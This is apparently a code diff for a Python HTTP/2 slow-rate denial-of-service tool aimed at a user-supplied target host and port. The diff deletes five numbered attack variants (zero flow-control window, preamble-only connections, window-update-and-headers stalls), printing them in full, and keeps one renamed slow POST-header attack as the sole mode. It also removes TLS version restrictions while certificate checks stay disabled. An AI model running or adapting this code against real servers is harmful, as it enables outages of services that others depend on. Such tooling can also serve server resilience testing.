@@ -15,9 +15,6 @@ def get_http2_ssl_context():
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
     ctx.options |= ssl.OP_NO_COMPRESSION
-    ctx.options |= (
-        ssl.OP_NO_SSLv2 | ssl.OP_NO_SSLv3 | ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1
-    )
     ctx.set_alpn_protocols(["h2"])
 
     return ctx
@@ -30,20 +27,7 @@ def negotiate_tls(tcp_conn, context):
 
     return tls_conn
 
-def attack1(tls_conn, h2_conn):
-    h2_conn._data_to_send += PREAMBLE
-    h2_conn.update_settings({SettingsFrame.INITIAL_WINDOW_SIZE: 0})
-    tls_conn.sendall(h2_conn.data_to_send())
-    headers = [
-        (':authority', args.target),
-        (':path', '/'),
-        (':scheme', 'https'),
-        (':method', 'GET'),
-    ]
-    h2_conn.send_headers(1, headers, end_stream=True)
-    tls_conn.sendall(h2_conn.data_to_send())
-
-def attack2(tls_conn, h2_conn):
+def slowRateDoSAttackCompletePOSTHeader(tls_conn, h2_conn):
     h2_conn.initiate_connection()
     wf = WindowUpdateFrame(0)
     wf.window_increment = WINDOW_INCREMENT_SIZE
@@ -62,60 +46,18 @@ def attack2(tls_conn, h2_conn):
     h2_conn._data_to_send += hf.serialize()
     tls_conn.sendall(h2_conn.data_to_send())
 
-def attack3(tls_conn, h2_conn):
-    h2_conn._data_to_send += PREAMBLE
-    tls_conn.sendall(h2_conn.data_to_send())
-
-def attack4(tls_conn, h2_conn):
-    h2_conn.initiate_connection()
-    wf = WindowUpdateFrame(0)
-    wf.window_increment = WINDOW_INCREMENT_SIZE
-    h2_conn._data_to_send += wf.serialize()
-    tls_conn.sendall(h2_conn.data_to_send())
-    headers = [
-        (':authority', args.target),
-        (':path', '/'),
-        (':scheme', 'https'),
-        (':method', 'GET'),
-    ]
-    hf = HeadersFrame(1)
-    hf.flags.add('END_STREAM')
-    e = Encoder()
-    hf.data = hf.data = e.encode(headers)
-    h2_conn._data_to_send += hf.serialize()
-    tls_conn.sendall(h2_conn.data_to_send())
-
-def attack5(tls_conn, h2_conn):
-    h2_conn.initiate_connection()
-    wf = WindowUpdateFrame(0)
-    wf.window_increment = WINDOW_INCREMENT_SIZE
-    h2_conn._data_to_send += wf.serialize()
-    tls_conn.sendall(h2_conn.data_to_send())
-    headers = [
-        (':authority', args.target),
-        (':path', '/'),
-        (':scheme', 'https'),
-        (':method', 'GET'),
-    ]
-    h2_conn.send_headers(1, headers, end_stream=True)
-    tls_conn.sendall(h2_conn.data_to_send())
-
 l = logging.Logger(name='test')
 ol = logging.StreamHandler(sys.stdout)
 ol.setLevel(logging.DEBUG)
 l.addHandler(ol)
 
 parser = argparse.ArgumentParser()
-parser.add_argument('-a', '--attack', type=int, choices=range(1, 6), help="specify the attack number")
 parser.add_argument('-t', '--target', type=str, required=True, help="specify the hostname or IP of the target")
 parser.add_argument('-p', '--port', type=int, default=443, help="target port")
 parser.add_argument('-P', '--process', type=int, default=1, help='Number of processes to spawn')
 parser.add_argument('-d', '--delay', type=float, default=0.1, help='Delay between requests (default: 0.1 seconds)')
 
 args = parser.parse_args()
-
-
-attacks = [attack1, attack2, attack3, attack4, attack5]
 
 # ./h2attack <attack nb> <target IP> <port>
 def main():
@@ -128,7 +70,7 @@ def main():
     config = H2Configuration(logger=l) #enable log
     h2_conn = h2.connection.H2Connection(config=config)
 
-    attacks[args.attack-1](tls_conn, h2_conn)
+    slowRateDoSAttackCompletePOSTHeader(tls_conn, h2_conn)
 
     # measure server timeout for closing the conn
     start = time.time()
